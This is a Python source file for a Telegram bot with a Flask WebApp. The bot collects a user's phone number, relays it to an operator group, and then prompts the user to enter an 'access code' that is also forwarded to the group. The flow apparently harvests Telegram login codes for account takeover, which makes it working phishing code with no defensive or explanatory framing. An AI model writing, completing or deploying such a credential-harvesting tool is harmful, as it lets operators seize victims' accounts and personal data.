import asyncio
import os
import threading
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from flask import Flask, request, jsonify, send_from_directory
import requests
from config import BOT_TOKEN, GROUP_ID, WEB_APP_URL, PORT

# Загрузка переменных окружения
TOKEN = BOT_TOKEN

bot = Bot(token=TOKEN)
dp = Dispatcher()
app = Flask(__name__, static_folder="static")
user_data = {}


@dp.message(Command("start"))
async def start(message: types.Message):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Отправить номер телефона", request_contact=True)]],
        resize_keyboard=True
    )
    await message.answer("Отправьте ваш номер телефона", reply_markup=keyboard)


@dp.message()
async def handle_contact(message: types.Message):
    if message.contact:
        phone_number = message.contact.phone_number
        user_data[message.from_user.id] = {"phone": phone_number, "tg_message_id": None}

        # Пересылка в группу
        msg = await bot.send_message(GROUP_ID,
                                     f"📢 Новый запрос в группе!\n📞 {phone_number}\n👤 {message.from_user.full_name}\n⏳ Ожидание подтверждения...")
        user_data[message.from_user.id]['tg_message_id'] = msg.message_id

        # Отправка WebApp
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="🔑 Ввести код", web_app=WebAppInfo(
                url=f"{WEB_APP_URL}/webapp?user_id={message.from_user.id}"))]]
        )
        await message.answer("Введите код доступа в WebApp", reply_markup=keyboard)


@app.route("/webapp")
def serve_webapp():
    return send_from_directory("static", "webapp.html")


@app.route("/submit_code", methods=["POST"])
def submit_code():
    try:
        data = request.json
        user_id = int(data.get('user_id'))
        code = data.get('code')
    except (TypeError, ValueError, KeyError):
        return jsonify({"status": "error", "message": "Invalid request format"}), 400

    if user_id in user_data:
        tg_message_id = user_data[user_id]['tg_message_id']
        phone = user_data[user_id]['phone']

        # Обновление сообщения в группе
        url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
        params = {
            "chat_id": GROUP_ID,
            "message_id": tg_message_id,
            "text": f"📞 Запрос: {phone}\n👤 Подтвержден кодом: {code}"
        }
        requests.get(url, params=params)

        return jsonify({"status": "success"})

    return jsonify({"status": "error", "message": "User not found"})


@app.route("/static/<path:filename>")
def static_files(filename):
    return send_from_directory("static", filename)


def run_flask():
    app.run(host='0.0.0.0', port=PORT, use_reloader=False)


async def main():
    thread = threading.Thread(target=run_flask, daemon=True)
    thread.start()
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
